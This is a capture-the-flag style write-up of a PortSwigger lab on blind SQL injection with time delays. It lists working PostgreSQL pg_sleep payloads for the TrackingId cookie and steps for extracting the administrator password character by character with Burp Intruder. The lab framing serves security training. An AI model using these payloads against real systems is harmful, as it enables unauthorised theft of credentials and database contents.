# Lab-15: [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. 

The database contains a different table called ```users```, with columns called ```username``` and ```password```. You need to exploit the blind SQL injection vulnerability to find out the password of the ```administrator``` user. 

**Aim :-** To solve the lab, log in as the administrator user. 



## Solution
- Confirm **SQL injection**
    - ``` '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- ``` add the payload to the end of the **TrackingId** cookie
        - The payload checks a condition ``` (1=1) ``` and if its true then the server delays the response for **10** seconds otherwise respond immediately

    - In here the condition is ``` (1=1) ``` and it is true for all the time makes the server delay **10** seconds to respond
    - To confirm, use the payload ``` '%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- ``` the condition in this payload is ```(1=2) ``` it is false so server respond immediately 


- Confirm ``` administrator ``` user
    - ``` '%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ``` this payload checks if there is a user called ``` administrator ``` present in  the table ``` users ``` then delay the responds for 10 seconds otherwise respond immediately. 

    - The responds come after **10** seconds confirming ``` administrator ``` user


- Find the number of characters in the ``` administrator ``` password
    - ``` '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ``` the payload checks whether the password of the ``` administrator ``` is **greater than 1 or not**, if its greater than 1 then the server respond after 10 seconds otherwise immediately.

    - Change the number from 1 to until the server respond immediately.

    - While adding **20** the server respond immediately confirms that the ``` administrator ``` password have **20 characters**( ``` '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```)


- Retrieve the **password**
    - ``` '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ``` the payload retrieve a single character from the password and compare with the given character (``` 'a' ```) if it both matches response delayed to 10 seconds 

    - Send the request to **Intruder** and select the **Cluster bombing attack**

    - Select index position 1 from ``` SUBSTRING(password,1,1)='a' ``` and click the **Add §** for select position 1, select the character ``` a ``` and click **Add §** for select position 2. The payload will look like the following
    ``` '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

    - Configure the payload **position 1** to **1-20** and payload **position 2** to **0-1** also **a-z**

    - To check whether the correct character was submitted, need to monitor the time taken for the application to respond to each request. For that configure the Intruder attack to issue requests in a single thread.
        - To do this, click the **Resource pool** tab to open the **Resource pool side panel**.

        - Add the attack to resource pool.  

        - Set the **Maximum concurrent requests** to 1
    
    - Start the attack

    - **Response received** column contain the time taken to respond, check for maximum number of times ( Probably more than 10000 milliseconds )

    - Retrieve the characters from the **payload 2** position in the order of 1-20 from the **payload 1**, combined these characters gives the ``` administrator ``` password
